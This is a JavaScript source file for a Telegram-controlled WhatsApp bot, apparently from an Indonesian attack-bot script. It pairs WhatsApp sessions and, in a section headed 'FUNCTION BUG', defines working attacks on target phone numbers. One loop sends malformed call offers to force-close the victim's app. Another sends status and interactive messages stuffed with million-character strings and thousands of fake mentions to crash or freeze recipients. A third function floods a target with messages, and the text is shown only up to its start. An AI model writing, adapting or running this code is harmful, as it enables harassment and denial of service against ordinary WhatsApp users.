const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require('xatabail');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const GH_OWNER = "PadukaJoyyy";
const GH_REPO = "autoupdateq";
const GH_BRANCH = "main";

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/PadukaJoyyy/NightShade/refs/heads/main/Database.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` JANGAN LUPA MASUK CH INFO SCRIPT⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

`));


console.log(chalk.greenBright(`
┌─────────────────────────────┐
│ ⚠️ inicialização em execução com sucesso  
├─────────────────────────────┤
│ DESENVOLVEDOR : JOYY      
│ TELEGRAMA : @joyyyclod
└─────────────────────────────┘
`));

console.log(chalk.blueBright(`
[ ----- ⚔️ ----- ]
`
));
};

validateToken();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363404925766191@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber}..... 𝙨𝙪𝙘𝙘𝙚𝙨\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363404925766191@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜\`\`\`
𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = [
    "https://ibb.co.com/bMFJgwG6",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

const bagUrl = "https://ibb.co.com/bMFJgwG6";
const ownerUrl = "https://ibb.co.com/bMFJgwG6";
const bugUrl = "https://ibb.co.com/bMFJgwG6";

// ~ Coldowwn

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function spamcall(target) {
  // Inisialisasi koneksi dengan makeWASocket
  const sock = makeWASocket({
    printQRInTerminal: false, // QR code tidak perlu ditampilkan
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    // Kirim permintaan panggilan
    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners(); // Hapus semua event listener
    sock.ws.close(); // Tutup koneksi WebSocket
  }
}

async function sendOfferCall(target) {
  try {
    await sock.offerCall(target);
    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}

async function sendOfferVideoCall(target) {
  try {
    await sock.offerCall(target, {
      video: true,
    });
    console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
  } catch (error) {
    console.error(
      chalk.white.bold(`Failed Send Offer Video Call To Target:`, error)
    );
  }
}
//--------------------------------------------FUNCTION BUG----------------------------------------------------------\\
// ~ ( FORCLOSE CALL PERMANEN ) ~ \\

async function SpamcallFcPermanen(sock, jid) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("xatabail");
    const crypto = require("crypto");
    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
    let devices = (
        await sock.getUSyncDevices([jid], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
    await sock.assertSessions(devices);
    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;
        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = bokep(
                    yntkts ? yntkts(msg) : encodeWAMessage(msg)
                );
                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });
                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );
        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        const callId = crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase();
        let {
            nodes: destinations,
            shouldIncludeDeviceIdentity
        } = await sock.createParticipantNodes(
            devices,
            { conversation: "y" },
            { count: "0" }
        );
        const callOffer = {
            tag: "call",
            attrs: {
                to: jid,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": callId,
                    "call-creator": sock.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
                ]
            }]
        };
        
        await sock.sendNode(callOffer);
        await sleep(1000);
        const callTerminate = {
            tag: "call",
            attrs: {
                to: jid,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "terminate",
                attrs: {
                    "call-id": callId,
                    "reason": "REJECTED",
                    "call-creator": sock.user.id
                },
                content: []
            }]
        };
        
        await sock.sendNode(callTerminate);
        await sleep(1000);
    }
    console.log("Done");
}

// ~ ( DELAY HARD INVISIBLE ) ~ \\

async function invisSpam(sock, jid) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];

    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            jid,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: jid }
            }
        );
        await sock.relayMessage(
            jid,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: jid }
            }
        );
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    const mediaDatamrb = [
        {
            ID: "68BD677B",
            uri: "t62.43144-24/10000000_1407285833860834_2249780575933148603_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AFffQpqWVK7GvldUiQQNd4Li_6BbUMZ3yHwZ55g5SuVKA&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "o+hchsgN0ZtdSp8iBlD1Yb/kx9Mkrer8km3pw5azkj0=",
            mkey: "C+7Uy3QyEAHwMpIR7CGaKEhpZ3KYFS67TcYxcNbm73EXo="
        },
        {
            ID: "68BD469B",
            uri: "t62.43144-24/10000000_2553936021621845_4020476590210043024_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AHPt6cTL57bihyVMMppUvQiXg-m7Oog3TAebzRVWsCNEw&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "2cGzUZDAYCZq7QbAoiWSI1h5Z0WIje7VK1IiUgqu/+Y=",
            mkey: "1EvzGhM2IL78wiXyfpRrcr8o0ws/hTjtghBQUF+v3wI="
        }
    ];

    let sequentialIndexmrb = 0;

    try {
        if (!sock || !sock.user) {
            throw new Error("Socket tidak terrekasi!");
        }

        console.log(chalk.green(`🚀 Memulai serangan Luldel ke ${targetNumber}`));

        let successCount = 0;
        let errorCount = 0;

        for (let i = 0; i < 3; i++) {
            try {
                if (!sock || !sock.user) {
                    throw new Error("Socket putus koneksi selama serangan!");
                }

                const selectedMedia = mediaDatamrb[sequentialIndexmrb];
                sequentialIndexmrb = (sequentialIndexmrb + 1) % mediaDatamrb.length;

                const MD_ID = selectedMedia.ID;
                const MD_Uri = selectedMedia.uri;
                const MD_Buffer = selectedMedia.buffer;
                const MD_SID = selectedMedia.sid;
                const MD_sha256 = selectedMedia.SHA256;
                const MD_encsha25 = selectedMedia.ENCSHA256;
                const mkey = selectedMedia.mkey;

                let parse = true;
                let type = "image/webp";
                if (11 > 9) {
                    parse = parse ? false : true;
                }

                let stickerMessage = {
                    viewOnceMessage: {
                        message: {
                            stickerMessage: {
                                url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
                                fileSha256: Buffer.from(MD_sha256, "base64"),
                                fileEncSha256: Buffer.from(MD_encsha25, "base64"),
                                mediaKey: Buffer.from(mkey, "base64"),
                                mimetype: type,
                                directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
                                fileLength: {
                                    low: Math.floor(Math.random() * 1000),
                                    high: 0,
                                    unsigned: true
                                },
                                mediaKeyTimestamp: {
                                    low: Math.floor(Math.random() * 1700000000),
                                    high: 0,
                                    unsigned: false
                                },
                                firstFrameLength: 19904,
                                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                isAnimated: true,
                                contextInfo: {
                                    participant: jid,
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from(
                                            { length: 1998 },
                                            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                        )
                                    ],
                                    groupMentions: [],
                                    entryPointConversionSource: "non_contact",
                                    entryPointConversionApp: "whatsapp",
                                    entryPointConversionDelaySeconds: 467593
                                },
                                stickerSentTs: {
                                    low: Math.floor(Math.random() * -20000000),
                                    high: 555,
                                    unsigned: parse
                                },
                                isAvatar: parse,
                                isAiSticker: parse,
                                isLottie: parse
                            }
                        }
                    }
                };

                let interactiveMessage = {
                    viewOnceMessage: {
                        message: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "蟽骗伪讗 搔伪喙€",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "call_permission_request",
                                    paramsJson: "\u0000".repeat(1045000),
                                    version: 3
                                },
                                entryPointConversionSource: "galaxy_message"
                            }
                        }
                    }
                };

                let galaxyMessage = {
                    viewOnceMessage: {
                        message: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "喙弔喔勛 蟼喙徯逞",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    paramsJson: "\x10".repeat(1045000),
                                    version: 3
                                },
                                entryPointConversionSource: "call_permission_request"
                            }
                        }
                    }
                };

                let textMessage = {
                    extendedTextMessage: {
                        text: "驴" + "軎".repeat(300000),
                        contextInfo: {
                            participant: jid,
                            mentionedJid: [
                                jid,
                                ...Array.from(
                                    { length: 2000 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                };

                const messages = [stickerMessage, interactiveMessage, galaxyMessage, textMessage];

                for (const msgContent of messages) {
                    const msg = generateWAMessageFromContent(jid, msgContent, {});
                    await sock.relayMessage(
                        "status@broadcast",
                        msg.message,
                        {
                            messageId: msg.key.id,
                            statusJidList: [jid],
                            additionalNodes: [
                                {
                                    tag: "meta",
                                    attrs: {},
                                    content: [
                                        {
                                            tag: "mentioned_users",
                                            attrs: {},
                                            content: [
                                                {
                                                    tag: "to",
                                                    attrs: { jid: jid },
                                                    content: undefined
                                                }
                                            ]
                                        }
                                    ]
                                }
                            ]
                        }
                    );
                }

                successCount++;

                const percent = ((i + 1) / 3) * 100;
                console.log(
                    chalk.red(
                        `Mengirim Luldel ke ${targetNumber.replace("@s.whatsapp.net", "")}\nProses: (${percent.toFixed(2)}%)`
                    )
                );
            } catch (batchError) {
                errorCount++;
                console.error(chalk.red(`❌ Batch ${i + 1}/3 GAGAL: ${batchError.message}`));
                if (errorCount > 3) {
                    console.error(chalk.red("⚠️ Terlalu banyak kesalahan, menghentikan serangan!"));
                    break;
                }
            }

            if (i < 2) {
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        console.log(chalk.green(`✓ ${successCount}/3`) + chalk.red(` ✗ ${errorCount}/3`));

        try {
            const lastMsg = generateWAMessageFromContent(
                jid,
                {
                    viewOnceMessage: {
                        message: {
                            stickerMessage: {
                                url: `https://mmg.whatsapp.net/v/${mediaDatamrb[0].uri}`,
                                fileSha256: Buffer.from(mediaDatamrb[0].SHA256, "base64"),
                                fileEncSha256: Buffer.from(mediaDatamrb[0].ENCSHA256, "base64"),
                                mediaKey: Buffer.from(mediaDatamrb[0].mkey, "base64"),
                                mimetype: "image/webp"
                            }
                        }
                    }
                },
                {}
            );

            await sock.relayMessage(
                jid,
                {
                    groupStatusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: lastMsg.key,
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: {
                                is_status_mention: " Luldel - serangan "
                            },
                            content: undefined
                        }
                    ]
                }
            );
            console.log(chalk.green("✅ Pesan menyebutkan berhasil dikirim"));
        } catch (mentionError) {
            console.error(chalk.red(`❌ gagal: ${mentionError.message}`));
        }

        return { success: true, successCount, errorCount };
    } catch (error) {
        console.error(chalk.red(`❌ Luldel KESALAHAN FATALE: ${error.message}`));
        return { success: false, error: error.message };
    }
}

async function ZhTxHxHgsGlx(sock, jid) {
  for (let i = 0; i < 50; i++) {
    let ZhTxRizzMsg = generateWAMessageFromContent(jid, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
        },
        body: {
          text: "Xst | Rayy - Ex3cutor",
          format: "DEFAULT"
